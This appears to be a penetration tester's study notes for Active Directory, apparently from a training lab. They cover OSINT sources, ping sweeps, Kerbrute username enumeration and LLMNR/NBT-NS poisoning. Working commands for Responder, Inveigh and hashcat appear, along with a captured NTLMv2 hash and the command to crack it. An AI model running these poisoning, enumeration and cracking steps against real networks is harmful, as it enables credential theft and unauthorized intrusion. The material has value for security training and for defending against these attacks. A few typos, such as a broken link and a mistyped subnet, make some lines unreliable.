# Content
- [Initial Enumeration](#initial-enumeration)
  - [Basic Info](#basic-info)
  - [Enumeration of the Domain](#enumeration-of-the-domain)
  - [Internal AD Username Enumeration](#internal-ad-username-enumeration)


# Initial Enumeration

## Basic Info 
### IP Space
- check [BGP Toolkit](https://bgp.he.net/) for ASN and ip ranges

### Domain Registrars & DNS
- [viewdns](https://viewdns.info/)
- [domaintools](https://whois.domaintools.com/)
- [domain.glass](https://domain.glass/)
- [hackertarget zone-transfer](https://hackertarget.com/zone-transfer/)
- manual using dig

### Public Data
#### github 
- [truffleHog](https://github.com/trufflesecurity/truffleHog)
- [hacktricks github-leaked-secrets](https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets)
#### cloud senstive files
- [grayhatwarfare](https://buckets.grayhatwarfare.com/)
#### Breach Data
- [haveibeenpwned](https://haveibeenpwned.com/)
- [dehashed](https://www.dehashed.com/)
#### google dorks
- [chr3st5an Google-Dorking cheatsheet](https://github.com/chr3st5an/Google-Dorking)
- [sundowndev Google-Dorking cheatsheet](https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06)

## Enumeration of the Domain
- wireshark / tcpdump
- responder
```shell
sudo responder -I ens224 -A
```
- fping / ping 
```shell 
fping -asgq 172.16.5.0/23


# msfconsole
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23          

# shell
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done    

# CMD
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}

```
- nmap

## Internal AD Username Enumeration
#### Kerbrute 

- [kerbrute](ttps://github.com/ropnop/kerbrute/)
- [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
```
sudo git clone https://github.com/ropnop/kerbrute.git
sudo make all
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
## or check compiled binaries https://github.com/ropnop/kerbrute/releases/tag/v1.0.3
```

# Sniffing out a Foothold
[Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) and [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN) (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. 

LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port `5355` over `UDP` natively. 

If LLMNR fails, the `NBT-NS` will be used. NBT-NS identifies systems on a local network by their `NetBIOS name`. NBT-NS utilizes port `137` over `UDP`.



**Example - LLMNR/NBT-NS Poisoning**

Let's walk through a quick example of the attack flow at a very high level:

    A host attempts to connect to the print server at \\print01.inlanefreight.local, but accidentally types in \\printer01.inlanefreight.local.
    The DNS server responds, stating that this host is unknown.
    The host then broadcasts out to the entire local network asking if anyone knows the location of \\printer01.inlanefreight.local.
    The attacker (us with Responder running) responds to the host stating that it is the \\printer01.inlanefreight.local that the host is looking for.
    The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
    This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.


| Tool                                                      | Description                                                                                           |
|-------------                                              |-------------------------------------------------------------------------------------------------------|
| [Responder](https://github.com/lgandx/Responder)          | Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.    |
| [Inveigh](https://github.com/Kevin-Robertson/Inveigh)     | Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.        |
| Metasploit  | Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.    |



## LLMNR/NBT-NS Poisoning - from Linux

```shell 
sudo responder -I ens224


[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
[SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:2294b990eee35ab0:C2D891F417EBB1E1187877CED230DDED:01010000000000000022B6703BA9DA01E2423A941650ABDB00000000020008004200430058004A0001001E00570049004E002D0047004D0039005600410033003000330030004E00580004003400570049004E002D0047004D0039005600410033003000330030004E0058002E004200430058004A002E004C004F00430041004C00030014004200430058004A002E004C004F00430041004C00050014004200430058004A002E004C004F00430041004C00070008000022B6703BA9DA01060004000200000008003000300000000000000000000000003000001CA7B9124B30F944D887B56A197F9EA349F4808891ECE19A9D46EBFB7856355A0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
```
crack the hash
```powerhsell
 .\hashcat.exe -m 5600 "backupagent::INLANEFREIGHT:2294b990eee35ab0:C2D891F417EBB1E1187877CED230DDED:01010000000000000022B6703BA9DA01E2423A941650ABDB00000000020008004200430058004A0001001E00570049004E002D0047004D0039005600410033003000330030004E00580004003400570049004E002D0047004D0039005600410033003000330030004E0058002E004200430058004A002E004C004F00430041004C00030014004200430058004A002E004C004F00430041004C00050014004200430058004A002E004C004F00430041004C00070008000022B6703BA9DA01060004000200000008003000300000000000000000000000003000001CA7B9124B30F944D887B56A197F9EA349F4808891ECE19A9D46EBFB7856355A0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" .\wordlists\rockyou.txt
```

## LLMNR/NBT-NS Poisoning - from Windows
- [Inveigh powershell version ](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1)


```powershell
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

- [Inveigh c# version](https://github.com/Kevin-Robertson/Inveigh)
```
 .\Inveigh.exe

# Press ESC to enter/exit interactive console
HELP 
GET NTLMV2USERNAMES
GET NTLMV2UNIQUE
```
